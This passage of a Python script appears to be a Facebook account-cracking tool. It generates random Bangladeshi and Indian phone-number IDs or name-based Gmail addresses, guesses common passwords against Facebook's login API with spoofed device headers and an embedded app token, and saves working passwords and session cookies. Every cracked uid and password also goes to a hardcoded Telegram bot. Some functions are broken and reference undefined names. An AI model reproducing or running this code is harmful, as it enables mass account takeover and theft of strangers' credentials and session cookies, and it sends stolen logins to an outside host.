                try:                    
                        clear();print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 3000 {R}|{G} 5000 {R}|{G} 10000 {R}|{G} 9999');linex()
                        limit = int(input(f'{R}❲{G}?{R}❳{G} Selection {R}:{G} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as MRM:     
                        clear()
                        tl = str(len(user))
                        print(f'             {R}❲{G}Bd Random Uid Cloning{R}❳{G}');linex()
                        print(f'{R}❲{G}~{R}❳{G} Total Id {R}:{A}',tl)
                        print(f'{R}❲{G}~{R}❳{G} Sim Code {R}:{A}',code)
                        print(f'{R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ');linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [ids[:8],ids[:7],ids[:6],ids[5:],ids[3:],ids[4:],ids[2:],ids,'i love you','iloveyou','alamin','nabila','halima','jannat','ariyan','nadiya','trisha','@@@###','fflover','sadiya','sabbir','sanjida','sumaiya','bangladesh','fariya','113355','shahin','nusrat','jesmin','ayesha','saiful','saidul','nazmul','112200','121234','506070','708090','203040','sarmin','mahadi','aaabbb']
                                MRM.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/HABIB_M1_FILE_OK.txt")
                print(f'\r{R}--------------------------------------------------')
                input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                os.system('python Main_HABIB.py')

##--------------INDIA_RANDOM------------##

def ind():
                user=[]
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} +91639 {R}|{G} +91620 {R}|{G} +91720 {R}|{G} +91789');linex()
                code = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
                try:                    
                        clear();print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 3000 {R}|{G} 5000 {R}|{G} 10000 {R}|{G} 9999');linex()
                        limit = int(input(f'{R}❲{G}?{R}❳{G} Selection {R}:{G} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as MRM:     
                        clear()
                        tl = str(len(user))
                        print(f'            {R}❲{G}India Random Uid Cloning{R}❳{G}');linex()
                        print(f'{R}❲{G}~{R}❳{G} Total Id {R}:{A}',tl)
                        print(f'{R}❲{G}~{R}❳{G} Sim Code {R}:{A}',code)
                        print(f'{R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ');linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx[2:],psx,code+psx,code+psx[:3],'57273200','59039200','57575751']
                                MRM.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/HABIB_M1_FILE_OK.txt")
                print(f'\r{R}--------------------------------------------------')
                input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                os.system('python Main_MRM.py')
 
##------------GMAIL------------## 
 
def gmail():
                os.system('rm -rf .gm.txt')
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} Chadni {R}|{G} Nurnobi {R}|{G} Sompa {R}|{G} HABIB');linex()
                first = input(f'{R}❲{G}~{R}❳{G} First Name {R}:{G} ')
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} khan {R}|{G} Islam {R}|{G} ali {R}|{G} Ahmed');linex()
                last = input(f'{R}❲{G}~{R}❳{G} Last Name {R}:{G} ')
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} @gmail.com {R}❲{G}ETC{R}❳{G}');linex()
                domain = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 3000 {R}|{G} 5000 {R}|{G} 10000 {R}|{G} 9999');linex()
                try:
                        limit=int(input(f'{R}❲{G}?{R}❳{G} Selection {R}:{G} '))
 
                except ValueError:
                        limit = 5000
                clear()
                print(f'{R}❲{G}~{R}❳{G} Laoding')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.gm.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.gm.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.gm.txt', 'r').read().splitlines()
                with tred(max_workers=30) as MRM:
                        total = str(len(fo))
                        clear()
                        print(f'             {R}❲{G}Gmail Cloning{R}❳{G}');linex()
                        print(f'{R}❲{G}~{R}❳{G} Total Id {R}:{G} '+total);print(f'{R}❲{G}~{R}❳{G} Target Full Name {R}:{G} '+first+last+domain);print(f'{R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ');linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
 
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Ahmed'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@@',fs+'@@@@']
                                MRM.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/HABIB_M1_FILE_OK.txt")
                print(f'\r{R}--------------------------------------------------')
                input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                os.system('python Main_MRM.py')
 
##-----------LOCK REMOVE---------## 
def lock(uid):
        po = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
        if 'Photoshop' in po:
            return 'Active'
        else:
            return 'Locked'
#############
import requests
def Habib(uid,pas):
    try:
        token = "6945341626:AAFDaUnkW8q-Rz-L1F_TSle3WMBkdgO3CkQ"
        chatid = "6672622185"
        ok_id =str(uid+"|"+pas)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
        
##-----------GMAIL&RANDOM METHOD---------##  
def rd1(ids,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}HABIB🥰-.{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                head = {'User-Agent':sex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
                if 'session_key' in po:
                        uid = str(po['uid'])
                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        cookie = f"sb={ssbb};{ckkk}"
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}❲{G}HABIB🥰-_OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                        	Habib(uid,pas)
                        print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'HABIB-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'HABIB-RANDOM-COOKIE.txt')
                        with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
                            file_ok.write(uid+' | '+pas+'\n')
                            file_cookies.write(uid+' | '+pas+' |-----> '+cookie+'\n')
                        oks.append(uid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                        uid = str(po['error']['error_data']['uid'])
                        print(f'\r{R}❲{Y}HABIB🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'HABIB-RANDOM-CP.txt')
                        with open(file_path, 'a') as file:
                            file.write(uid+' | '+pas+'\n')
                        cps.append(uid)
                        break
                else:
                    continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

##------------FILE_METHOD_(1)-----------##
def sex():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'Xiaomi'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Xiaomi'
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','SP1A.210812.016','TP1A.220905.001'])
	fbdv = random.choice(["Redmi Note 7", "Redmi Note 8", "Redmi Note 9", "Redmi Note 10", "Redmi 7", "Redmi 8", "Redmi 9", "Redmi 10", "Redmi 9A", "Redmi 9C", "Redmi K20", "Redmi K30", "Redmi K40", "Redmi 5A", "Redmi 6A", "Redmi 7A", "Redmi 8A", "Redmi 9T", "Redmi Note 7 Pro", "Redmi Note 8 Pro", "Redmi Note 4", "Redmi Note 5", "Redmi Note 6 Pro", "Redmi 4X", "Redmi Y2", "Redmi Note 8T"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua =f'Mozilla/5.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua=f'Mozilla/3.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua 

 
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}HABIB-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head =  {'User-Agent':Sex(),'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '1.649999976158142','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"','sec-ch-ua-mobile':str(random.randint(2e4, 4e4)),'sec-ch-ua-model':str(random.randint(2e4, 4e4)),'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980',}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&wtsid=rdr_0T3EkpCcdmBbg9nps&refsrc=deprecated&ref_component=mbasic_footer&_rdr',).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G} IHABIB🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    Habib(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'HABIB-FILE-M1-OK.txt')
                    open('/sdcard/XD/HABIB-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}HABIB🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'HABIB-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

##------------FILE_METHOD_(2)-----------##
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}HABIB-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            head ={'User-Agent':Sex(),'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '1.649999976158142','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"','sec-ch-ua-mobile':str(random.randint(2e4, 4e4)),'sec-ch-ua-model':str(random.randint(2e4, 4e4)),'sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980',}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            po = requests.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&wtsid=rdr_0T3EkpCcdmBbg9nps&refsrc=deprecated&ref_component=mbasic_footer&_rdr',).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}HABIB🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    Habib(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'HABIB-FILE-M2-OK.txt')
                    open('/sdcard/XD/HABIB-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}HABIB🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'HABIB-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

##------------END-------------##

try:Main_HABIB()
except requests.exceptions.ConnectionError:
    print(f'\n\033[1;92m [×] \033[1;91mনেট পাচ্ছে না ভাই  ...')
except Exception as e:pass
 
 